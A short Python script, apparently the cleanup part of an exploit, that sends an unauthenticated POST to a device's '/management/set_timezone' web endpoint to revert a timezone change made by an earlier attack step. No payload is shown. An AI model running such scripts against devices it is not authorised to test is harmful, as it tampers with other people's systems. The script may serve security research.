import requests, sys

def exploit(ip, timezone_revert):
	url = f'http://{ip}/index.php/management/set_timezone'

	# Revert timestamp change. Change this if your device uses a different timezone.
	orig_data = {'timezone': timezone_revert}
	try:
		r2 = requests.post(url, data=orig_data, timeout=5)
	except requests.exceptions.ReadTimeout:
		pass

	print(f'Reverted timestamp to {timezone_revert}')

if __name__ == '__main__':
    if(len(sys.argv) < 3):
    	print('[+] USAGE: python3 %s device_ip timezone'%(sys.argv[0]))
    	print('[+] USAGE: python3 %s 192.168.1.10 Europe/Amsterdam'%(sys.argv[0]))
    	exit(0)
    else:
    	exploit(sys.argv[1],sys.argv[2])
